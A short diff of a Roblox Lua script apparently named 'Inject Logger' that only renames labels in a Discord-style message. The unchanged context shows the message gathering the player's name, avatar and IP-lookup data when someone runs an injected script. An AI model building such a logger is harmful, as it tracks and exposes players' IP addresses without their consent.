@@ -17,13 +17,13 @@ do
             local player = game.Players.LocalPlayer
             local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
             local ipData = self.ipApi
-            scriptName = scriptName or 'Inject Logger'
+            scriptName = scriptName or 'Ezarther'
             return {
                 content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                 embeds  = {
                     { 
                         author={
-                                name='---------',
+                                name='Inject Logger',
                                 url='https://discord.gg/z7NxmM4k',
                                 icon_url='https://media.discordapp.net/attachments/768071654295207967/906190414111997952/images.jpg'
                         },
@@ -72,7 +72,7 @@ do
                             },
                         },
                         footer = {
-                            text = '------',
+                            text = 'Inject Logger',
                             icon_url='https://media.discordapp.net/attachments/768071654295207967/906190414111997952/images.jpg'
                         }
                     }
